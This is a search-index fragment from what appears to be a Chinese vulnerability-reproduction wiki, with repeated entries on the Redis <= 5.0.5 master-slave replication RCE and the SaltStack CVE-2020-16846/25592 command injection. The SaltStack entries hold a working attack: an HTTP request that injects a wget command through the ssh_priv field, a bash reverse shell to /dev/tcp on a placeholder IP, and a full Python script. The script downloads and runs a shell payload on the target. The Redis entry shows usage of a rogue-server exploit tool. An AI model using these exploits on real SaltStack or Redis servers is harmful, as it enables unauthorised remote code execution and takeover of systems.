Final\u4e0a\uff0cLC/BC\u7684\u6210\u5458Pavel Toporkov\u5728\u5206\u4eab\u4f1a\u4e0a\u4ecb\u7ecd\u4e86\u4e00\u79cd\u5173\u4e8eredis\u65b0\u7248\u672c\u7684RCE\u5229\u7528\u65b9\u5f0f\uff0c\u6bd4\u8d77\u4ee5\u524d\u7684\u5229\u7528\u65b9\u5f0f\u6765\u8bf4\uff0c\u8fd9\u79cd\u5229\u7528\u65b9\u5f0f\u66f4\u4e3a\u901a\u7528\uff0c\u5371\u5bb3\u4e5f\u66f4\u5927 Pavel Toporkov\u7684\u5206\u4eab \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Redis <= 5.0.5 \u73af\u5883\u642d\u5efa \u00b6 docker pull damonevking/redis5.0 docker run -p 6379 :6379 -d damonevking/redis5.0 redis-server nmap\u626b\u63cf\u4e00\u4e0b6379\u7aef\u53e3\u5f00\u653e\u5373\u4e3a\u642d\u5efa\u6210\u529f root@kali:~/\u684c\u9762# docker pull damonevking/redis5.0 Using default tag: latest latest: Pulling from damonevking/redis5.0 fc7181108d40: Pull complete 3e0ac67cad82: Pull complete 6ee495cb7235: Pull complete 9f7206d08b9d: Pull complete a8354ef8cccb: Pull complete 53afb10d81c2: Pull complete Digest: sha256:adcf62f378efe1187d2f72c6f0ecdf86ab2173a9e1c3c9f4fe4bb89060f5362f Status: Downloaded newer image for damonevking/redis5.0:latest docker.io/damonevking/redis5.0:latest root@kali:~/\u684c\u9762# docker run -p 6379 :6379 -d damonevking/redis5.0 redis-server 1275aa9c6c8f8ad0b6c8e58e609be6681acedec301b5593f7e8b0bd65f7fad12 root@kali:~/\u684c\u9762# nmap 127 .0.0.1 -p 6379 Starting Nmap 7 .80 ( https://nmap.org ) at 2020 -12-08 21 :47 CST Nmap scan report for localhost ( 127 .0.0.1 ) Host is up ( 0 .000099s latency ) . PORT STATE SERVICE 6379 /tcp open redis Nmap done : 1 IP address ( 1 host up ) scanned in 0 .10 seconds \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5173\u4e8e\u6f0f\u6d1e\u539f\u7406\u8bf7\u67e5\u770b Pavel Toporkov\u7684\u5206\u4eab \u6f0f\u6d1e\u5229\u7528\u811a\u672c: n0b0dyCN/redis-rogue-server \u279c ./redis-rogue-server.py -h ______ _ _ ______ _____ | ___ \\ | ( _ ) | ___ \\ / ___ | | | _/ /___ __ | | _ ___ | | _/ /___ __ _ _ _ ___ \\ ` --. ___ _ ____ _____ _ __ | // _ \\/ _ ` | / __ | | // _ \\ / _ ` | | | | / _ \\ ` --. \\/ _ \\ '__\\ \\ / / _ \\ ' __ | | | \\ \\ __/ ( _ | | \\_ _ \\ | | \\ \\ ( _ ) | ( _ | | | _ | | __/ / \\_ _/ / __/ | \\ V / __/ | \\_ | \\_\\_ __ | \\_ _,_ | _ | ___/ \\_ | \\_\\_ __/ \\_ _, | \\_ _,_ | \\_ __ | \\_ ___/ \\_ __ | _ | \\_ / \\_ __ | _ | __/ | | ___/ @copyright n0b0dy @ r3kapig Usage: redis-rogue-server.py [ options ] Options: -h, --help show this help message and exit --rhost = REMOTE_HOST target host --rport = REMOTE_PORT target redis port, default 6379 --lhost = LOCAL_HOST rogue server ip --lport = LOCAL_PORT rogue server listen port, default 21000 --exp = EXP_FILE Redis Module to load, default exp.so -v, --verbose Show full data stream Example python3 redis-rogue-server.py --rhost 192 .168.51.146 --lhost 192 .168.51.146 --exp = exp.so","title":"Redis \u5c0f\u4e8e5.0.5 \u4e3b\u4ece\u590d\u5236 RCE"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Redis/Redis%20%E5%B0%8F%E4%BA%8E5.0.5%20%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%20RCE%20/#redis--505-\u4e3b\u4ece\u590d\u5236-rce","text":"","title":"Redis &lt;= 5.0.5 \u4e3b\u4ece\u590d\u5236 RCE"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Redis/Redis%20%E5%B0%8F%E4%BA%8E5.0.5%20%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%20RCE%20/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u57282019\u5e747\u67087\u65e5\u7ed3\u675f\u7684WCTF2019 Final\u4e0a\uff0cLC/BC\u7684\u6210\u5458Pavel Toporkov\u5728\u5206\u4eab\u4f1a\u4e0a\u4ecb\u7ecd\u4e86\u4e00\u79cd\u5173\u4e8eredis\u65b0\u7248\u672c\u7684RCE\u5229\u7528\u65b9\u5f0f\uff0c\u6bd4\u8d77\u4ee5\u524d\u7684\u5229\u7528\u65b9\u5f0f\u6765\u8bf4\uff0c\u8fd9\u79cd\u5229\u7528\u65b9\u5f0f\u66f4\u4e3a\u901a\u7528\uff0c\u5371\u5bb3\u4e5f\u66f4\u5927 Pavel Toporkov\u7684\u5206\u4eab","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Redis/Redis%20%E5%B0%8F%E4%BA%8E5.0.5%20%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%20RCE%20/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Redis <= 5.0.5","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Redis/Redis%20%E5%B0%8F%E4%BA%8E5.0.5%20%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%20RCE%20/#\u73af\u5883\u642d\u5efa","text":"docker pull damonevking/redis5.0 docker run -p 6379 :6379 -d damonevking/redis5.0 redis-server nmap\u626b\u63cf\u4e00\u4e0b6379\u7aef\u53e3\u5f00\u653e\u5373\u4e3a\u642d\u5efa\u6210\u529f root@kali:~/\u684c\u9762# docker pull damonevking/redis5.0 Using default tag: latest latest: Pulling from damonevking/redis5.0 fc7181108d40: Pull complete 3e0ac67cad82: Pull complete 6ee495cb7235: Pull complete 9f7206d08b9d: Pull complete a8354ef8cccb: Pull complete 53afb10d81c2: Pull complete Digest: sha256:adcf62f378efe1187d2f72c6f0ecdf86ab2173a9e1c3c9f4fe4bb89060f5362f Status: Downloaded newer image for damonevking/redis5.0:latest docker.io/damonevking/redis5.0:latest root@kali:~/\u684c\u9762# docker run -p 6379 :6379 -d damonevking/redis5.0 redis-server 1275aa9c6c8f8ad0b6c8e58e609be6681acedec301b5593f7e8b0bd65f7fad12 root@kali:~/\u684c\u9762# nmap 127 .0.0.1 -p 6379 Starting Nmap 7 .80 ( https://nmap.org ) at 2020 -12-08 21 :47 CST Nmap scan report for localhost ( 127 .0.0.1 ) Host is up ( 0 .000099s latency ) . PORT STATE SERVICE 6379 /tcp open redis Nmap done : 1 IP address ( 1 host up ) scanned in 0 .10 seconds","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Redis/Redis%20%E5%B0%8F%E4%BA%8E5.0.5%20%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%20RCE%20/#\u6f0f\u6d1e\u590d\u73b0","text":"\u5173\u4e8e\u6f0f\u6d1e\u539f\u7406\u8bf7\u67e5\u770b Pavel Toporkov\u7684\u5206\u4eab \u6f0f\u6d1e\u5229\u7528\u811a\u672c: n0b0dyCN/redis-rogue-server \u279c ./redis-rogue-server.py -h ______ _ _ ______ _____ | ___ \\ | ( _ ) | ___ \\ / ___ | | | _/ /___ __ | | _ ___ | | _/ /___ __ _ _ _ ___ \\ ` --. ___ _ ____ _____ _ __ | // _ \\/ _ ` | / __ | | // _ \\ / _ ` | | | | / _ \\ ` --. \\/ _ \\ '__\\ \\ / / _ \\ ' __ | | | \\ \\ __/ ( _ | | \\_ _ \\ | | \\ \\ ( _ ) | ( _ | | | _ | | __/ / \\_ _/ / __/ | \\ V / __/ | \\_ | \\_\\_ __ | \\_ _,_ | _ | ___/ \\_ | \\_\\_ __/ \\_ _, | \\_ _,_ | \\_ __ | \\_ ___/ \\_ __ | _ | \\_ / \\_ __ | _ | __/ | | ___/ @copyright n0b0dy @ r3kapig Usage: redis-rogue-server.py [ options ] Options: -h, --help show this help message and exit --rhost = REMOTE_HOST target host --rport = REMOTE_PORT target redis port, default 6379 --lhost = LOCAL_HOST rogue server ip --lport = LOCAL_PORT rogue server listen port, default 21000 --exp = EXP_FILE Redis Module to load, default exp.so -v, --verbose Show full data stream Example python3 redis-rogue-server.py --rhost 192 .168.51.146 --lhost 192 .168.51.146 --exp = exp.so","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/SaltStack%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-16846%2025592/","text":"SaltStack \u672a\u6388\u6743\u8bbf\u95ee\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2020-16846/25592 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2020\u5e7411\u67084\u65e5\uff0cSaltStack \u5b98\u65b9\u53d1\u5e03\u4e86\u4e00\u5219\u5b89\u5168\u66f4\u65b0\u516c\u544a\uff0c\u5176\u4e2dCVE-2020-16846\u548cCVE-2020-25592\u7ec4\u5408\u4f7f\u7528\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u901a\u8fc7salt-api\u63a5\u53e3\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002CVE-2020-25592\u5141\u8bb8\u4efb\u610f\u7528\u6237\u8c03\u7528SSH\u6a21\u5757\uff0cCVE-2020-16846\u5141\u8bb8\u7528\u6237\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002salt-api\u867d\u4e0d\u662f\u9ed8\u8ba4\u5f00\u542f\u914d\u7f6e\uff0c\u4f46\u7edd\u5927\u591a\u6570SaltStack\u7528\u6237\u4f1a\u9009\u62e9\u5f00\u542fsalt-api\uff0c\u6545\u5b58\u5728\u8f83\u9ad8\u98ce\u9669\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] SaltStack Version 3002 SaltStack Version 3001.1, 3001.2 SaltStack Version 3000.3, 3000.4 SaltStack Version 2019.2.5, 2019.2.6 SaltStack Version 2018.3.5 SaltStack Version 2017.7.4, 2017.7.8 SaltStack Version 2016.11.3, 2016.11.6,2016.11.10 SaltStack Version 2016.3.4, 2016.3.6,2016.3.8 SaltStack Version 2015.8.10, 2015.8.13 \u73af\u5883\u642d\u5efa \u00b6 [!NOTE] git clone https://github.com/vulhub/vulhub.git cd vulhub/saltstack/CVE-2020-16846 docker-compose up -d \u6f0f\u6d1e\u590d\u73b0 \u00b6 salt-api REST\u63a5\u53e3\u9ed8\u8ba4\u4f7f\u7528cherrypy\u6846\u67b6\uff0c\u4ecerun\u63a5\u53e3\u7684\u5b9e\u73b0\u4e0a\u53ef\u4ee5\u770b\u51fa\u901a\u8fc7client\u53c2\u6570\u52a8\u6001\u8c03\u7528NetapiClient\u7c7b\u4e2d\u7684\u65b9\u6cd5\u3002 \u6587\u4e2d\u6307\u5b9a\u4ee3\u7801\u4f4d\u7f6e\u91c7\u7528\u4ee5\u4e0b\u7ea6\u5b9a FileLocation:Classname.method() salt/netapi/init.py:NetapiClient.run() low\u53c2\u6570\u4e3a\u5916\u90e8\u4f20\u5165\u53c2\u6570\uff0csalt.utils.args.format_call\u65b9\u6cd5\u5c06\u53c2\u6570\u8d4b\u503c\u7ed9**kwargs\u3002** \u5f53client\u53c2\u6570\u4e3assh\u65f6\uff0c\u52a8\u6001\u8c03\u7528**salt/netapi/init.py:NetapiClient.ssh()**, \u8be5\u65b9\u6cd5\u672a\u91c7\u7528\u4efb\u4f55\u9274\u6743\u3002 salt/netapi/init.py:NetapiClient.ssh() \u8ddf\u8fdb\uff0c\u8def\u5f84\u5982\u4e0b\uff1a salt/netapi/init.py:NetapiClient.ssh()\u21d2salt/client/ssh/client.py:SSHClient.cmd_sync()\u21d2salt/client/ssh/client.py:SSHClient._prep_ssh() salt/client/ssh/client.py:SSHClient._prep_ssh() \u8be5\u65b9\u6cd5\u5c06kwargs\u5916\u90e8\u53ef\u63a7\u53c2\u6570\u66f4\u65b0\u503copts\u53d8\u91cf\uff0c\u8be5\u53d8\u91cf\u53ef\u4ee5\u7406\u89e3\u4e3aSaltStack\u7cfb\u7edf\u7684\u73af\u5883\u53d8\u91cf\uff0c\u4f7f\u7528\u8be5\u53d8\u91cf\u521d\u59cb\u5316salt.client.ssh.SSH\u3002 salt/client/ssh/init.py:SSH. init () priv\u7684\u503c\u4eceopts\u53d8\u91cf\u4e2d\u83b7\u53d6\uff0c\u5e76\u8c03\u7528salt.client.ssh.shell.gen_key()\u65b9\u6cd5\u3002 salt/client/ssh/shell.py:gen_key() POC\u8bf7\u6c42\u5305\u4e3a POST /run HTTP/1.1 Host: 127 .0.0.1:8000 User-Agent: Mozilla/5.0 ( Macintosh ; Intel Mac OS X 10 .15 ; rv:68.0 ) Gecko/20100101 Firefox/68.0 Accept: application/x-yaml Accept-Language: en-US,en ; q = 0 .5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 109 token = 12312 & client = ssh & tgt = * & fun = a & roster = whip1ash & ssh_priv = aaa | wget http://xxx.dnslog.cn \u53cd\u5f39shell\u7684\u65b9\u6cd5 \u5148\u5199 bash\u6587\u4ef6\uff0c\u5185\u5bb9\u4e3a\u53cd\u5f39shell\u8bed\u53e5\uff0c\u4f7f\u7528wget\u4e0b\u8f7d\u5230\u76ee\u6807\u4e2d [!NOTE] !/bin/sh \u00b6 bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1' \u76d1\u542c\u7aef\u53e3\uff0c\u4f7f\u7528 /bin/bash \u8fd0\u884c\u6587\u4ef6 \u53cd\u5f39shell \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] POC\u76ee\u5f55\u4e2d peiqi.sh\u6587\u4ef6 \u9700\u8981\u66f4\u6539\u53cd\u5f39ip,port,\u5e76\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u8ba9\u76ee\u6807\u8fdb\u884c\u4e0b\u8f7d DNS\u6709\u54cd\u5e94\u5219\u4ee3\u8868\u53ef\u80fd\u6709\u6f0f\u6d1e\uff0c\u4fbf\u53ef\u4ee5\u8fdb\u884c\u53cd\u5f39shell import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: SaltStack Version < 2019.2.4 & < 3000.2 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mDnslog >>> xxx.dnslog.cn \\033 [0m' ) print ( '+ \\033 [36mFile_addr >>> http://xxx.xxx.xxx/cmd.sh \\033 [0m' ) print ( '+ \\033 [36mFile_name >>> cmd.sh \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url , dnslog ): vuln_url = target_url + \"/run\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"DNT\" : \"1\" , \"Connection\" : \"close\" , \"Upgrade-Insecure-Requests\" : \"1\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Accept\" : \"application/x-yaml\" , \"Accept-Language\" : \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|wget http:// {} \" . format ( dnslog ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 10 ) print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884c wget http:// {} \\033 [0m\" . format ( dnslog )) if \"return\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u8bf7\u67e5\u770b Dnslog\u54cd\u5e94 \\033 [0m\" ) while True : Chois = input ( \" \\033 [35m\u662f\u5426\u53cd\u5f39 Shell(Y/N) >>> \\033 [0m\" ) if Chois == \"Y\" or Chois == \"y\" : File_addr = input ( \" \\033 [35mFile_addr >>> \\033 [0m\" ) File_name = input ( \" \\033 [35mFile_name >>> \\033 [0m\" ) POC_2 ( target_url , File_addr , File_name ) else : sys . exit ( 0 ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , File_addr , File_name ): vuln_url = target_url + \"/run\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"DNT\" : \"1\" , \"Connection\" : \"close\" , \"Upgrade-Insecure-Requests\" : \"1\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Accept\" : \"application/x-yaml\" , \"Accept-Language\" : \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|wget {} \" . format ( File_addr ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 10 ) print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884c wget {} \\033 [0m\" . format ( File_addr )) if \"return\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u4e0b\u8f7d {} \\033 [0m\" . format ( File_addr )) POC_3 ( target_url , File_name ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , File_name ): vuln_url = target_url + \"/run\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Accept-Encoding\" : \"gzip, deflate\" , \"DNT\" : \"1\" , \"Connection\" : \"close\" , \"Upgrade-Insecure-Requests\" : \"1\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" , \"Accept\" : \"application/x-yaml\" , \"Accept-Language\" : \"en-US,en;q=0.5\" } data = \"token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=peiqi|/bin/bash {} \" . format ( File_name ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 10 ) print ( \" \\033 [32m[o] \u6b63\u5728\u6267\u884c /bin/bash \\033 [0m\" . format ( File_name )) if \"return\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u547d\u4ee4\u6267\u884c\u5b8c\u6bd5\uff0c\u8bf7\u67e5\u770b\u662f\u5426\u53cd\u5f39Shell \\033 [0m\" . format ( File_name )) sys . exit ( 0 ) else : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [32m[o] \u547d\u4ee4\u6267\u884c\u6210\u529f \\033 [0m\" ) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) dnslog = str ( input ( \" \\033 [35mDnslog >>> \\033 [0m\" )) POC_1 ( target_url , dnslog ) \u53c2\u8003\u6587\u7ae0 \u00b6 https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag","title":"SaltStack \u672a\u6388\u6743\u8bbf\u95ee\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2020-16846 25592"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/SaltStack%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-16846%2025592/#saltstack-\u672a\u6388\u6743\u8bbf\u95ee\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e-cve-2020-1684625592","text":"","title":"SaltStack \u672a\u6388\u6743\u8bbf\u95ee\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2020-16846/25592"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/SaltStack%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-16846%2025592/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2020\u5e7411\u67084\u65e5\uff0cSaltStack \u5b98\u65b9\u53d1\u5e03\u4e86\u4e00\u5219\u5b89\u5168\u66f4\u65b0\u516c\u544a\uff0c\u5176\u4e2dCVE-2020-16846\u548cCVE-2020-25592\u7ec4\u5408\u4f7f\u7528\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u901a\u8fc7salt-api\u63a5\u53e3\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002CVE-2020-25592\u5141\u8bb8\u4efb\u610f\u7528\u6237\u8c03\u7528SSH\u6a21\u5757\uff0cCVE-2020-16846\u5141\u8bb8\u7528\u6237\u6267\u884c\u4efb\u610f\u547d\u4ee4\u3002salt-api\u867d\u4e0d\u662f\u9ed8\u8ba4\u5f00\u542f\u914d\u7f6e\uff0c\u4f46\u7edd\u5927\u591a\u6570SaltStack\u7528\u6237\u4f1a\u9009\u62e9\u5f00\u542fsalt-api\uff0c\u6545\u5b58\u5728\u8f83\u9ad8\u98ce\u9669\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/SaltStack%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-16846%2025592/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] SaltStack Version 3002 SaltStack Version 3001.1, 3001.2 SaltStack Version 3000.3, 3000.4 SaltStack Version 2019.2.5, 2019.2.6 SaltStack Version 2018.3.5 SaltStack Version 2017.7.4, 2017.7.8 SaltStack Version 2016.11.3, 2016.11.6,2016.11.10 SaltStack Version 2016.3.4, 2016.3.6,2016.3.8 SaltStack Version 2015.8.10, 2015.8.13","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/SaltStack%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-16846%2025592/#\u73af\u5883\u642d\u5efa","text":"[!NOTE] git clone https://github.com/vulhub/vulhub.git cd vulhub/saltstack/CVE-2020-16846 docker-compose up -d","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/SaltStack%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-16846%2025592/#\u6f0f\u6d1e\u590d\u73b0","text":"salt-api REST\u63a5\u53e3\u9ed8\u8ba4\u4f7f\u7528cherrypy\u6846\u67b6\uff0c\u4ecerun\u63a5\u53e3\u7684\u5b9e\u73b0\u4e0a\u53ef\u4ee5\u770b\u51fa\u901a\u8fc7client\u53c2\u6570\u52a8\u6001\u8c03\u7528NetapiClient\u7c7b\u4e2d\u7684\u65b9\u6cd5\u3002 \u6587\u4e2d\u6307\u5b9a\u4ee3\u7801\u4f4d\u7f6e\u91c7\u7528\u4ee5\u4e0b\u7ea6\u5b9a FileLocation:Classname.method() salt/netapi/init.py:NetapiClient.run() low\u53c2\u6570\u4e3a\u5916\u90e8\u4f20\u5165\u53c2\u6570\uff0csalt.utils.args.format_call\u65b9\u6cd5\u5c06\u53c2\u6570\u8d4b\u503c\u7ed9**kwargs\u3002** \u5f53client\u53c2\u6570\u4e3assh\u65f6\uff0c\u52a8\u6001\u8c03\u7528**salt/netapi/init.py:NetapiClient.ssh()**, \u8be5\u65b9\u6cd5\u672a\u91c7\u7528\u4efb\u4f55\u9274\u6743\u3002 salt/netapi/init.py:NetapiClient.ssh() \u8ddf\u8fdb\uff0c\u8def\u5f84\u5982\u4e0b\uff1a salt/netapi/init.py:NetapiClient.ssh()\u21d2salt/client/ssh/client.py:SSHClient.cmd_sync()\u21d2salt/client/ssh/client.py:SSHClient._prep_ssh() salt/client/ssh/client.py:SSHClient._prep_ssh() \u8be5\u65b9\u6cd5\u5c06kwargs\u5916\u90e8\u53ef\u63a7\u53c2\u6570\u66f4\u65b0\u503copts\u53d8\u91cf\uff0c\u8be5\u53d8\u91cf\u53ef\u4ee5\u7406\u89e3\u4e3aSaltStack\u7cfb\u7edf\u7684\u73af\u5883\u53d8\u91cf\uff0c\u4f7f\u7528\u8be5\u53d8\u91cf\u521d\u59cb\u5316salt.client.ssh.SSH\u3002 salt/client/ssh/init.py:SSH. init () priv\u7684\u503c\u4eceopts\u53d8\u91cf\u4e2d\u83b7\u53d6\uff0c\u5e76\u8c03\u7528salt.client.ssh.shell.gen_key()\u65b9\u6cd5\u3002 salt/client/ssh/shell.py:gen_key() POC\u8bf7\u6c42\u5305\u4e3a POST /run HTTP/1.1 Host: 127 .0.0.1:8000 User-Agent: Mozilla/5.0 ( Macintosh ; Intel Mac OS X 10 .15 ; rv:68.0 ) Gecko/20100101 Firefox/68.0 Accept: application/x-yaml Accept-Language: en-US,en ; q = 0 .5 Accept-Encoding: gzip, deflate DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 109 token = 12312 & client = ssh & tgt = * & fun = a & roster = whip1ash & ssh_priv = aaa | wget http://xxx.dnslog.cn \u53cd\u5f39shell\u7684\u65b9\u6cd5 \u5148\u5199 bash\u6587\u4ef6\uff0c\u5185\u5bb9\u4e3a\u53cd\u5f39shell\u8bed\u53e5\uff0c\u4f7f\u7528wget\u4e0b\u8f7d\u5230\u76ee\u6807\u4e2d [!NOTE]","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/SaltStack%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-16846%2025592/#binsh","text":"bash -c 'exec bash -i &>/dev/tcp/xxx.xxx.xxx.xxx/9999 <&1' \u76d1\u542c\u7aef\u53e3\uff0c\u4f7f\u7528 /bin/bash \u8fd0\u884c\u6587\u4ef6 